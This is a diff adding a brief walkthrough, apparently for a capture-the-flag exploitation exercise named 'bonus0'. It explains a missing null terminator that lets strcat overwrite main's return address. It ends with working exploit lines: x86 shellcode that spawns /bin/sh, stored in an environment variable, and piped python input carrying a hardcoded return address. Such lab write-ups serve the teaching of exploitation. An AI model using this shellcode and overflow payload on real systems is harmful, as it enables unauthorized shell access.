@@ -1,0 +1,40 @@
+in p() fonction they
+replace first '\n' by '\0'
+and take first 20 char.
+
+in pp() fonction they 
+join both string give
+and add a space between.
+
+in main() fonction they 
+store strings and display
+the new string
+
+by giving a string of more
+than 20 char '\0' is not set
+at end of string.
+so strlen and strcat miss this
+end. Whereof we can overwrite
+main adress retrun.
+
+start of joined string
+is 0x36 upstream return.
+First part of this pad is
+the both strings and a space,
+that lead us to 41 on 54 char
+needed, remain 13 char to the 
+goal. put our adress at second
+string and 13. fill the rest
+without null byte.
+
+adress of our shellcode gived in 
+environement.
+
+job done
+
+
+SSH_CLIENT=$(python -c 'print  "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+
+
+(python -c 'print "A" * 20' ; python -c 'print "B" * 9 + "\xef\xf8\xff\xbf" + "C" * 7' ; cat -) | ./bonus0
+
